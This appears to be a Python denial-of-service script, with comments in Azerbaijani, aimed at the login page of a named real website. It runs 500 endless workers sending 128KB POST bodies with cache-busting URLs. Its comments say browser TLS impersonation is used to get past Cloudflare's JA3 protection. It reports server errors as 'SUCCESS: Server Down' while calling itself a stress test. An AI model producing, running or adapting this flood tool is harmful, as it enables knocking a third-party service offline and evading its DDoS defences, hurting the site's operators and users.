import asyncio
import random
import time
from curl_cffi.requests import AsyncSession

# --- CONFIG ---
TARGET = "https://empro.az/#/login"
CONCURRENCY = 500  # Railway planınızın gücünə görə 1000-ə qədər artıra bilərsiniz
TIMEOUT = 10

# Ağır yük üçün random POST datası yaradır (Serverin RAM-ını yormaq üçün)
def generate_payload(size_kb=64):
    return "x=" + ("A" * (size_kb * 1024))

async def stress_worker(session, worker_id):
    """Sonsuz döngüdə Cloudflare bypass sorğuları göndərir"""
    payload = generate_payload(128) # 128KB hər sorğuda
    
    while True:
        # Cache bypass üçün hər sorğuda unikal URL
        url = f"{TARGET}/?v={random.random()}&ts={time.time()}"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive"
        }
        
        try:
            # impersonate="chrome110" Cloudflare JA3 bypass üçün mütləqdir
            resp = await session.post(
                url, 
                data=payload, 
                headers=headers, 
                timeout=TIMEOUT,
                impersonate="chrome110"
            )
            if resp.status_code >= 500:
                print(f"[Worker-{worker_id}] SUCCESS: Server Down (5xx)!")
            else:
                print(f"[Worker-{worker_id}] Delivered: {resp.status_code}")
        except Exception:
            # Server bağlantını kəsirsə (çökürsə) bura düşür
            print(f"[Worker-{worker_id}] Target Unreachable (Server Crashing...)")
            await asyncio.sleep(0.1) # Qısa fasilə verərək yenidən yoxla

async def main():
    print(f"[*] Railway Stress Testi Başlayır: {TARGET}")
    print(f"[*] Worker sayı: {CONCURRENCY}")
    
    # Connection pool-u idarə edən asenkron sessiya
    async with AsyncSession(http2=True) as session:
        workers = []
        for i in range(CONCURRENCY):
            workers.append(stress_worker(session, i))
        
        # Bütün worker-ları eyni anda işə salır
        await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
